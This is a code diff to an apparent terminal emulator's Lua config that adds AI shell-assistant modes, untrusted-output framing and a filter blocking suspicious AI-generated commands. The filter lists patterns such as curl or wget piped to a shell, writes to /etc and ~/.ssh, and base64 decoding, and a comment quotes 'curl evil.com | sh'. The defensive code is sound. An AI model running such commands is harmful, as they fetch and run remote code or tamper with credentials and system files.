@@ -888,6 +888,47 @@ local function detect_git_branch(path)
   return trim_trailing_whitespace(stdout)
 end
 
+-- Loads a static prompt file shipped under assets/prompts/.
+-- In a built bundle the prompts live next to kaku.lua under Resources/prompts/.
+-- In dev mode (cargo run), fall back to the repo's assets/prompts/ path.
+-- Strips the leading <!-- ... --> metadata block. Caches the result.
+--
+-- Fallback strings exist so a missing prompt file does not produce an empty
+-- system message (the model would then misbehave silently). They are
+-- intentionally minimal: the *real* prompts in assets/prompts/ carry the
+-- untrusted-output framing and examples, so falling back is a degraded
+-- mode and we log a warning to make that visible in debug builds.
+local prompt_cache = {}
+local prompt_fallbacks = {
+  ["ai_fix.txt"] = "You are a shell troubleshooting assistant. Return one JSON object with summary, command, why, confidence. command must be a single direct fix command. If not confident, set command to empty string.",
+  ["ai_generate.txt"] = "You are a shell command assistant. Return one JSON object with summary, command, why, confidence. command must be a single executable shell command. If you cannot produce a safe direct command, set command to empty string.",
+}
+local function load_prompt(name)
+  if prompt_cache[name] then
+    return prompt_cache[name]
+  end
+  local candidates = {}
+  if wezterm and wezterm.executable_dir then
+    candidates[#candidates + 1] = wezterm.executable_dir:gsub("MacOS/?$", "Resources") .. "/prompts/" .. name
+    candidates[#candidates + 1] = wezterm.executable_dir .. "/../../assets/prompts/" .. name
+  end
+  for _, path in ipairs(candidates) do
+    local f = io.open(path, "r")
+    if f then
+      local content = f:read("*a") or ""
+      f:close()
+      content = content:gsub("^<!%-%-.-%-%->%s*", "")
+      content = trim_trailing_whitespace(content)
+      prompt_cache[name] = content
+      return content
+    end
+  end
+  ai_debug_log("load_prompt fallback used for " .. tostring(name) .. " (file missing under Resources/prompts and dev assets/prompts; running in degraded mode)")
+  local fb = prompt_fallbacks[name] or ""
+  prompt_cache[name] = fb
+  return fb
+end
+
 local function build_ai_fix_messages(failed_command, exit_code, cwd, git_branch, terminal_output)
   local context = {
     "Command: " .. failed_command,
@@ -905,13 +946,13 @@ local function build_ai_fix_messages(failed_command, exit_code, cwd, git_branch,
     if #trimmed > max_chars then
       trimmed = trimmed:sub(#trimmed - max_chars + 1)
     end
-    context[#context + 1] = "\nTerminal output (recent):\n" .. trimmed
+    context[#context + 1] = "\n---UNTRUSTED OUTPUT START---\n" .. trimmed .. "\n---UNTRUSTED OUTPUT END---"
   end
 
   return {
     {
       role = "system",
-      content = "You are a shell troubleshooting assistant. Use the terminal output to identify the specific error and suggest a precise fix. Output English only and return exactly one JSON object with keys summary, command, why, confidence. Do not use markdown or code fences. summary must be one concise sentence <= 72 chars and must not contain parentheses. command must be a single direct fix command without commentary. Avoid diagnostic-only commands, alias probing, and placeholders. Never use aliases like ll. If you are not confident about a direct fix, set command to an empty string.",
+      content = load_prompt("ai_fix.txt"),
     },
     {
       role = "user",
@@ -1243,6 +1284,45 @@ local function is_dangerous_command(command)
   return false
 end
 
+-- Detect AI-generated commands that look like injection attempts.
+-- These patterns should never appear in a legitimate single-command fix or
+-- shell-synth result; if any model returns them, refuse to load into the
+-- prompt buffer and let the user see the command as plain text only.
+-- Reasoning: a hallucinated `cd /tmp && curl evil.com | sh` should not be
+-- one Enter away from execution.
+local function ai_command_injection_risk(command)
+  if type(command) ~= "string" or command == "" then
+    return false
+  end
+  local lower = command:lower()
+  local patterns = {
+    "%$%(",                        -- $(...) command substitution
+    "`",                           -- backtick command substitution
+    "curl[^\n]*|%s*sh",            -- curl ... | sh
+    "curl[^\n]*|%s*bash",          -- curl ... | bash
+    "curl[^\n]*|%s*zsh",           -- curl ... | zsh
+    "wget[^\n]*|%s*sh",            -- wget ... | sh
+    "wget[^\n]*|%s*bash",          -- wget ... | bash
+    "wget[^\n]*|%s*zsh",           -- wget ... | zsh
+    "%s>%s*/etc/",                 -- > /etc/...
+    "%s>>%s*/etc/",                -- >> /etc/...
+    "%s>%s*/var/log/",             -- > /var/log/...
+    "%s>%s*~/%.ssh/",              -- > ~/.ssh/...
+    "%s>>%s*~/%.ssh/",             -- >> ~/.ssh/...
+    "/etc/passwd",
+    "/etc/shadow",
+    "authorized_keys",
+    "eval%s+%$",                   -- eval $...
+    "base64%s+%-%-?d",             -- base64 -d (often used to hide payload)
+  }
+  for _, pattern in ipairs(patterns) do
+    if lower:find(pattern) then
+      return true
+    end
+  end
+  return false
+end
+
 local function is_non_actionable_ai_command(command)
   local normalized = trim_surrounding_whitespace(command or "")
   if normalized == "" then
@@ -1306,6 +1386,37 @@ local function should_skip_ai_fix_for_failed_command(failed_command, exit_code)
   return false
 end
 
+-- Valid intents the # flow understands. Anything else is normalised to
+-- "command_synth" so the loader stays backwards-compatible with old models
+-- that still only return {summary, command, why, confidence}.
+local function normalize_intent(value)
+  local v = trim_surrounding_whitespace(tostring(value or "")):lower()
+  if v == "explain" or v == "web_lookup" or v == "candidates" then
+    return v
+  end
+  return "command_synth"
+end
+
+local function normalize_candidates(value)
+  if type(value) ~= "table" then
+    return {}
+  end
+  local out = {}
+  for _, entry in ipairs(value) do
+    if type(entry) == "table" then
+      local cmd = sanitize_suggested_command(entry.command or "")
+      if cmd ~= "" then
+        local why = trim_surrounding_whitespace(tostring(entry.why or ""))
+        out[#out + 1] = { command = cmd, why = why }
+        if #out >= 3 then
+          break
+        end
+      end
+    end
+  end
+  return out
+end
+
 local function parse_ai_fix_result(content)
   local parsed = parse_json_object_from_text(content or "")
   if type(parsed) == "table" then
@@ -1313,11 +1424,17 @@ local function parse_ai_fix_result(content)
     local command = sanitize_suggested_command(parsed.command or "")
     local why = trim_surrounding_whitespace(tostring(parsed.why or ""))
     local confidence = tonumber(parsed.confidence) or 0
+    local intent = normalize_intent(parsed.intent)
+    local explanation = trim_surrounding_whitespace(tostring(parsed.explanation or ""))
+    local candidates = normalize_candidates(parsed.candidates)
     return {
       summary = summary,
       command = command,
       why = why,
       confidence = confidence,
+      intent = intent,
+      explanation = explanation,
+      candidates = candidates,
     }
   end
 
@@ -1327,6 +1444,9 @@ local function parse_ai_fix_result(content)
     command = "",
     why = "",
     confidence = 0,
+    intent = "command_synth",
+    explanation = "",
+    candidates = {},
   }
 end
 
@@ -1540,11 +1660,16 @@ local function detect_project_type(cwd)
   return table.concat(found, ", ")
 end
 
-local function build_ai_generate_messages(query, cwd, git_branch, terminal_output)
-  local context = {
-    "Request: " .. query,
-    "Working directory: " .. (cwd ~= "" and cwd or "(unknown)"),
-  }
+local function build_ai_generate_messages(query, cwd, git_branch, terminal_output, mode)
+  mode = mode or "auto"
+  local context = {}
+  if mode == "explain" then
+    context[#context + 1] = "Mode hint: the user typed `#?`, so intent must be 'explain'. Return intent='explain' with a 1-3 sentence answer in explanation. Leave command empty."
+  elseif mode == "candidates" then
+    context[#context + 1] = "Mode hint: the user typed `##`, so intent must be 'candidates'. Return intent='candidates' with up to 3 entries in a candidates array, each with {command, why}. Leave command empty at the top level."
+  end
+  context[#context + 1] = "Request: " .. query
+  context[#context + 1] = "Working directory: " .. (cwd ~= "" and cwd or "(unknown)")
   if git_branch ~= "" then
     context[#context + 1] = "Git branch: " .. git_branch
   end
@@ -1558,12 +1683,12 @@ local function build_ai_generate_messages(query, cwd, git_branch, terminal_outpu
     if #trimmed > max_chars then
       trimmed = trimmed:sub(#trimmed - max_chars + 1)
     end
-    context[#context + 1] = "\nRecent terminal output:\n" .. trimmed
+    context[#context + 1] = "\n---UNTRUSTED OUTPUT START---\n" .. trimmed .. "\n---UNTRUSTED OUTPUT END---"
   end
   return {
     {
       role = "system",
-      content = "You are a shell command assistant. Use the working directory context and project type to generate accurate commands (e.g. cargo test for Rust, npm test for JS). Output English only and return exactly one JSON object with keys summary, command, why, confidence. Do not use markdown or code fences. summary must be one concise sentence <= 72 chars and must not contain parentheses. command must be a single executable shell command that fulfills the request. Never use aliases like ll. If you cannot produce a safe direct command, set command to an empty string.",
+      content = load_prompt("ai_generate.txt"),
     },
     {
       role = "user",
@@ -1669,9 +1794,10 @@ local function poll_ai_generate_job(window, pane, pane_id, job)
       local cwd = pane_state.cwd or ""
       local git_branch = pane_state.git_branch or ""
       local term_output = pane_state.terminal_output or ""
+      local mode = pane_state.mode or "auto"
       pane_state.inflight = true
       pane_state.spinner_frame = 0
-      local ok, err = request_ai_generate_async(window, pane, pane_id, query, cwd, git_branch, term_output)
+      local ok, err = request_ai_generate_async(window, pane, pane_id, query, cwd, git_branch, term_output, mode)
       if not ok then
         pane_state.inflight = false
         ai_debug_log("ai_generate_job retry failed err=" .. tostring(err))
@@ -1704,6 +1830,62 @@ local function poll_ai_generate_job(window, pane, pane_id, job)
   end
 
   local command = sanitize_suggested_command(result.command or "")
+  local intent = result.intent or "command_synth"
+
+  -- Intent classification: # is not always command synthesis. The model may
+  -- mark the request as `explain` (conceptual / how-does-X-work) or
+  -- `web_lookup` (needs live web search). For those, show the answer as a
+  -- toast and skip the PTY injection.
+  if intent == "explain" then
+    local body = result.explanation
+    if not body or body == "" then
+      body = result.summary or ""
+    end
+    ctrl_ai_generate_spinner(pane, pane_state, true)
+    safe_send_clear(pane)
+    inject_ai_status_and_finalize(pane, normalize_ai_summary(body, "No explanation available."))
+    return
+  end
+  if intent == "web_lookup" then
+    ctrl_ai_generate_spinner(pane, pane_state, true)
+    safe_send_clear(pane)
+    inject_ai_status_and_finalize(
+      pane,
+      "Needs live web data. Open Cmd+L to ask with web search enabled."
+    )
+    return
+  end
+  if intent == "candidates" then
+    local cands = result.candidates or {}
+    ctrl_ai_generate_spinner(pane, pane_state, true)
+    safe_send_clear(pane)
+    if #cands == 0 then
+      inject_ai_status_and_finalize(pane, "No candidates returned.")
+      return
+    end
+    -- Filter out injection-risk candidates so we never display dangerous
+    -- copy-paste targets. Display the rest as a numbered list; user picks
+    -- by retyping or copy/paste (no interactive picker on the # surface).
+    local lines = { normalize_ai_summary(result.summary or "", "Candidate commands:") }
+    local shown = 0
+    for _, c in ipairs(cands) do
+      if not ai_command_injection_risk(c.command) then
+        shown = shown + 1
+        local line = "  " .. tostring(shown) .. ". " .. c.command
+        if c.why ~= "" then
+          line = line .. "    -- " .. c.why
+        end
+        lines[#lines + 1] = line
+      end
+    end
+    if shown == 0 then
+      inject_ai_status_and_finalize(pane, "All candidates were blocked for safety.")
+      return
+    end
+    inject_ai_status_and_finalize(pane, table.concat(lines, "\n"))
+    return
+  end
+
   if command == "" then
     ctrl_ai_generate_spinner(pane, pane_state, true)
     safe_send_clear(pane)
@@ -1712,6 +1894,14 @@ local function poll_ai_generate_job(window, pane, pane_id, job)
   end
 
   ctrl_ai_generate_spinner(pane, pane_state, true)
+  if ai_command_injection_risk(command) then
+    safe_send_clear(pane)
+    inject_ai_status_and_finalize(
+      pane,
+      "Blocked: generated command looks like injection. Suggested text: " .. command
+    )
+    return
+  end
   local sent_ok = safe_send_clear(pane, command)
   if not sent_ok then
     inject_ai_status_and_finalize(pane, "Could not inject generated command.")
@@ -1722,8 +1912,8 @@ local function poll_ai_generate_job(window, pane, pane_id, job)
   end
 end
 
-local function request_ai_generate_async(window, pane, pane_id, query, cwd, git_branch, terminal_output)
-  local messages = build_ai_generate_messages(query, cwd, git_branch, terminal_output)
+local function request_ai_generate_async(window, pane, pane_id, query, cwd, git_branch, terminal_output, mode)
+  local messages = build_ai_generate_messages(query, cwd, git_branch, terminal_output, mode)
   local payload, payload_err = encode_ai_fix_payload(ai_fix_model, messages)
   if not payload then
     return nil, payload_err or "failed to encode request payload"
@@ -3209,6 +3399,14 @@ wezterm.on('kaku-ai-apply-last-fix', function(window, pane)
     return
   end
 
+  if ai_command_injection_risk(command) then
+    inject_ai_status(
+      pane,
+      "Blocked: suggested command looks like injection. Text: " .. command
+    )
+    return
+  end
+
   local send_text = command .. "\n"
   local toast_message = "Applied suggested command."
   if is_dangerous_command(command) then
@@ -3414,7 +3612,20 @@ wezterm.on('user-var-changed', function(window, pane, name, value)
     return
   end
 
-  local query = trim_surrounding_whitespace(value or "")
+  local raw = trim_surrounding_whitespace(value or "")
+  if raw == "" then
+    return
+  end
+
+  -- The shell-integration widgets prepend "[mode:auto|explain|candidates] "
+  -- so we know whether the user typed '#', '#?', or '##'. Older widget
+  -- versions (or non-shell injectors) will pass the bare query and fall
+  -- through to mode=auto.
+  local mode, query = raw:match("^%[mode:(%w+)%]%s*(.*)$")
+  if not mode then
+    mode = "auto"
+    query = raw
+  end
   if query == "" then
     return
   end
@@ -3470,6 +3681,7 @@ wezterm.on('user-var-changed', function(window, pane, name, value)
   pane_state.spinner_line_active = false
   pane_state.retry_count = 0
   pane_state.query = query:gsub("[%c]", "")
+  pane_state.mode = mode
 
   local cwd = pane_cwd(pane)
   local git_branch = detect_git_branch(cwd)
@@ -3480,7 +3692,7 @@ wezterm.on('user-var-changed', function(window, pane, name, value)
   pane_state.cwd = cwd
   pane_state.git_branch = git_branch
   pane_state.terminal_output = terminal_output
-  local ok, err = request_ai_generate_async(window, pane, pane_id, query, cwd, git_branch, terminal_output)
+  local ok, err = request_ai_generate_async(window, pane, pane_id, query, cwd, git_branch, terminal_output, mode)
   if not ok then
     pane_state.inflight = false
     pane_state.pending_job_id = nil
